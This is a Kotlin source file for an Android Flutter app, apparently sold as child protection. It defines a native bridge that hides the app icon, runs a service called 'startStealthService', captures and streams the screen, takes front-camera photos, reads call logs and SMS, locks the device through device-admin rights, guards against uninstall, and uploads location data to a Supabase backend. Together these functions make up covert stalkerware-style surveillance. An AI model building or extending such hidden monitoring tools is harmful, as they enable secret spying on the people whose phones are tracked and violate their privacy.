package com.surokkhanet.child

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NativeBridge(private val context: Context, private val activity: Activity) {

    private val channel = "com.surokkhanet/native"
    private val client = OkHttpClient()

    // Supabase configuration
    object SupabaseConfig {
        const val supabaseUrl = "YOUR_SUPABASE_URL"
        const val supabaseAnonKey = "YOUR_SUPABASE_ANON_KEY"
    }

    fun configure(flutterEngine: FlutterEngine) {
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channel).setMethodCallHandler { call, result ->
            try {
                when (call.method) {
                    "activateDeviceAdmin" -> activateDeviceAdmin(result)
                    "openAccessibilitySettings" -> openAccessibilitySettings(result)
                    "hideAppIcon" -> hideAppIcon(result)
                    "startStealthService" -> startBackgroundService(result)
                    "captureScreen" -> captureScreen(result)
                    "startScreenStream" -> startScreenStream(result)
                    "stopScreenStream" -> stopScreenStream(result)
                    "lockDevice" -> lockDevice(result)
                    "takeFrontPhoto" -> takeFrontPhoto(result)
                    "getCallLogs" -> getCallLogs(result)
                    "getSms" -> getSms(result)
                    "triggerUninstall" -> triggerUninstall(result)
                    "reportLocation" -> {
                        val data = call.arguments as Map<String, Any>
                        reportLocation(data, result)
                    }
                    else -> result.notImplemented()
                }
            } catch (e: Exception) {
                result.error("ERROR", e.message, null)
            }
        }
    }

    private fun activateDeviceAdmin(result: MethodChannel.Result) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                ComponentName(context, DeviceAdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "শিশু সুরক্ষা ফিচারগুলোর জন্য ডিভাইস এডমিন সক্রিয় করতে হবে")
        }
        activity.startActivityForResult(intent, 100)
        result.success(true)
    }

    private fun openAccessibilitySettings(result: MethodChannel.Result) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
        result.success(true)
    }

    private fun hideAppIcon(result: MethodChannel.Result) {
        val componentName = ComponentName(context, "com.surokkhanet.child.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        result.success(true)
    }

    private fun startBackgroundService(result: MethodChannel.Result) {
        val intent = Intent(context, BackgroundService::class.java)
        ContextCompat.startForegroundService(context, intent)
        result.success(true)
    }

    private fun startScreenStream(result: MethodChannel.Result) {
        ScreenStreamer.startStreaming(context)
        result.success(true)
    }
    
    private fun stopScreenStream(result: MethodChannel.Result) {
        ScreenStreamer.stopStreaming()
        result.success(true)
    }

    private fun lockDevice(result: MethodChannel.Result) {
        if (DeviceAdminReceiver.isAdminActive(context)) {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
            result.success(true)
        } else {
            result.error("ADMIN_REQUIRED", "ডিভাইস এডমিন সক্রিয় হয়নি", null)
        }
    }

    private fun captureScreen(result: MethodChannel.Result) {
        try {
            val bitmap = captureScreenShot()
            val path = saveBitmapToFile(bitmap)
            result.success(path)
        } catch (e: Exception) {
            result.error("CAPTURE_FAILED", "স্ক্রিন ক্যাপচার করতে ব্যর্থ: ${e.message}", null)
        }
    }

    private fun takeFrontPhoto(result: MethodChannel.Result) {
        try {
            val path = CameraController.takeFrontPhoto(context)
            result.success(path)
        } catch (e: Exception) {
            result.error("CAMERA_ERROR", "ফটো তুলতে ব্যর্থ: ${e.message}", null)
        }
    }

    private fun getCallLogs(result: MethodChannel.Result) {
        try {
            val callLogs = CallLogService.fetchCallLogs(context)
            result.success(callLogs)
        } catch (e: Exception) {
            result.error("CALL_LOG_ERROR", "কল লগ আনতে ব্যর্থ: ${e.message}", null)
        }
    }

    private fun getSms(result: MethodChannel.Result) {
        try {
            val smsList = SmsService.fetchSmsMessages(context)
            result.success(smsList)
        } catch (e: Exception) {
            result.error("SMS_ERROR", "এসএমএস আনতে ব্যর্থ: ${e.message}", null)
        }
    }

    private fun triggerUninstall(result: MethodChannel.Result) {
        try {
            UninstallHandler.triggerUninstallProtection(context)
            result.success(true)
        } catch (e: Exception) {
            result.error("UNINSTALL_ERROR", "আনইন্সটল প্রোটেকশন ট্রিগার করতে ব্যর্থ: ${e.message}", null)
        }
    }

    private fun reportLocation(data: Map<String, Any>, result: MethodChannel.Result) {
        try {
            sendToSupabase("locations", data)
            result.success(true)
        } catch (e: Exception) {
            result.error("LOCATION_ERROR", e.message, null)
        }
    }

    private fun sendToSupabase(endpoint: String, data: Map<String, Any>) {
        val json = JSONObject(data as Map<*, *>).toString()
        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaType())
        
        val request = Request.Builder()
            .url("${SupabaseConfig.supabaseUrl}/rest/v1/$endpoint")
            .post(requestBody)
            .addHeader("apikey", SupabaseConfig.supabaseAnonKey)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.supabaseAnonKey}")
            .addHeader("Content-Type", "application/json")
            .addHeader("Prefer", "return=minimal")
            .build()
        
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                android.util.Log.e("Supabase", "Error: ${e.message}")
            }
            
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    android.util.Log.e("Supabase", "Error: ${response.code}")
                }
            }
        })
    }

    private fun captureScreenShot(): Bitmap {
        // Placeholder: Actual screen capture implementation
        return Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888)
    }

    private fun saveBitmapToFile(bitmap: Bitmap): String {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "SCREEN_$timeStamp.jpg"
        val file = File(context.getExternalFilesDir(null), fileName)
        
        FileOutputStream(file).use { out ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out)
        }
        
        return file.absolutePath
    }
}